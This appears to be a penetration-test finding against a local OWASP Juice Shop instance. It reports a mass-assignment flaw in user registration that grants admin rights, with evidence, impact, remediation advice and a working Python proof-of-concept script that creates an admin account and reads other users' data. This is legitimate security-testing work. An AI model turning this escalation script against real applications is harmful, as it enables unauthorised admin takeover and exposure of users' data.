# Mass assignment of role at registration allows unauthenticated admin account creation

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-09-11 19:52:07 UTC
**Target:** http://host.docker.internal:3001
**CVSS:** 9.4
**Confidence:** High
**Fix Effort:** Low

## Description

The user registration endpoint binds the client-supplied `role` field without restriction, allowing any unauthenticated attacker to create an account with the `admin` role and receive a valid admin JWT on login.

## Evidence

Registration response: `{"status":"success","data":{...,"email":"auth.spec.massadm@juice-sh.op","role":"admin",...}}`. Login returned an RS256 JWT whose payload contains `"role":"admin"`. With that token, `GET /api/Users` (admin-gated) returned the full user list including `admin@juice-sh.op` (id=1), and `GET /rest/basket/1` returned another user's basket. `GET /rest/user/whoami` with the token as cookie confirmed the authenticated admin identity.

## Impact

Immediate full administrator compromise of the application from an unauthenticated position: the attacker can list all user accounts and their data, read/modify any user's basket and orders, modify products and prices, view accounting data, and access all admin functionality. No prior credentials or user interaction required.

## Counterevidence

Checked whether registration or role binding is restricted: the endpoint performs no server-side allowlist of the `role` field, and login plus server-side admin checks (GET /api/Users, cross-user basket read) confirmed the granted role is authoritative rather than cosmetic. Registration is open by default config (application-configuration `registration` true), so no precondition limits this. The Angular UI not exposing the role field is client-side only and does not constrain the API.

## What Would Change This Severity

If server-side role allowlisting were added at registration, this finding would be fully remediated; no evidence of any such control exists in the tested deployment.

## Technical Analysis

`POST /api/Users` maps the JSON request body directly onto the Sequelize User model on creation. The client-supplied `role` attribute is persisted verbatim instead of being forced to `customer`. On subsequent login, `POST /rest/user/login` loads the stored record and signs an RS256 JWT whose payload embeds `role:"admin"`, and all server-side authorization checks (e.g., `/api/Users` listing, cross-user basket access, admin REST endpoints) trust that claim. The Angular client simply never offers the role field in its registration form — the API accepts it anyway.

## Proof of Concept

1. Send `POST /api/Users` with JSON body `{"email":"<new-email>","password":"...","passwordRepeat":"...","role":"admin"}`. 2. Observe the 201 response returns the created user with `role:"admin"`. 3. Log in via `POST /rest/user/login` with the new credentials; the response JWT payload contains `"role":"admin"`. 4. Use the token as `Authorization: Bearer` on the admin-gated `GET /api/Users` and it returns the full user list (including admin@juice-sh.op); `GET /rest/basket/1` returns another user's basket, confirming server-side admin authorization is granted.

```python
import requests

BASE = "http://host.docker.internal:3001"
s = requests.Session()

reg = s.post(f"{BASE}/api/Users", json={
    "email": "auth.spec.massadm@juice-sh.op",
    "password": "AuthSpec123!",
    "passwordRepeat": "AuthSpec123!",
    "role": "admin",
    "securityQuestion": {"id": 1, "question": "x"},
    "securityAnswer": "adm",
})
print(reg.status_code, reg.json()["data"]["role"])  # 201 admin

login = s.post(f"{BASE}/rest/user/login", json={
    "email": "auth.spec.massadm@juice-sh.op",
    "password": "AuthSpec123!",
})
token = login.json()["authentication"]["token"]

users = s.get(f"{BASE}/api/Users", headers={"Authorization": f"Bearer {token}"})
print(users.status_code, "user count:", len(users.json()["data"]))  # 200, full user list

basket = s.get(f"{BASE}/rest/basket/1", headers={"Authorization": f"Bearer {token}"})
print(basket.status_code, basket.json()["UserId"])  # 200, UserId 1 (admin@juice-sh.op's basket)
```

## Remediation

Remove the `role` field from the request payload bound at registration and hard-code the default role server-side; maintain an explicit field allowlist for user creation so client-supplied privilege, status, or entitlement fields (role, isActive, deluxeToken) are never persisted. Reject or silently discard any attempt to set a privileged role at the public registration endpoint.

## Assumptions

Registration endpoint is open (default Juice Shop configuration); demo instance with seeded data.
